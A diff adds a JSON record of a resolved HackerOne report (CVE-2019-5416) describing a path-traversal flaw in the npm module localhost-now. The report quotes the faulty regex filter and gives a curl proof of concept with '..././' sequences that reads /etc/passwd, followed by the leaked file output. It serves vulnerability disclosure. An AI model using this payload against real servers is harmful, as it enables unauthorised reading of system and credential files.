@@ -1,0 +1,131 @@
+{
+  "id": 334837,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQ4Mzc=",
+  "url": "https://hackerone.com/reports/334837",
+  "title": "[localhost-now] bypassing url filter which leads to read content of arbitrary file",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-09T09:23:56.500Z",
+  "submitted_at": "2018-04-09T09:23:56.500Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dienpv",
+    "url": "/dienpv",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/227/300/d7f486347eda37208b64fe99b58a684fbdbcde6e_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5416"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-30T13:05:21.202Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-30T12:59:41.145Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi guys,\ni can bypass url filter in localhost-now module.\nIt allows to read content of arbitrary files on the remote server.\n\n# Module\n\n**module name:** localhost-now\n**version:** 1.0.2\n**npm page:** https://www.npmjs.com/package/localhost-now\n\n## Module Stats\n\n26 downloads in the last week\n\n## Vulnerability Description\n\nLack of file path sanitization by using the regex method causes that any file on the server might be read by malicious user\nex: input: url = ..././etc/passwd\nwhen the url calls replace(/(\\.\\.[\\/\\\\])+/g, '') and then ../ will be removed -> final result: url = ../etc/passwd. (same in windows for ```...\\.\\```)\n```javascript\n// /localhost-now/lib/app.js, line 17:\nconst file = url === '/' ? '/index.html' : url.replace(/(\\.\\.[\\/\\\\])+/g, '')\n```\n## Steps To Reproduce:\n- install ```localhost-now```:\n```npm install localhost-now```\n- run ```localhost-now``` in your directory\n\n```\nroot@kali:/var/www/html/localhost-now/bin# nodejs localhost\nWeb Server started on localhost:1337\n```\n- execute following curl command (adjust number of ../ to reflect your system):\n\n``` curl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd ```\n- look at result:\n\n```\n* Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)\n> GET /..././..././..././..././..././etc/passwd HTTP/1.1\n> Host: 127.0.0.1:1337\n> User-Agent: curl/7.50.1\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< content-type: text/\n< Date: Mon, 09 Apr 2018 09:04:13 GMT\n< Connection: keep-alive\n< Content-Length: 2908\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n```\nthanks you\n\n## Impact\n\nThis vulnerability might be used to read content of any file on the server",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-06-29T12:59:41.230Z",
+  "allow_singular_disclosure_after": -248063080.66867948,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "bl4de",
+    "eveeez",
+    "dienpv",
+    "khoata"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5908,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "localhost-now",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
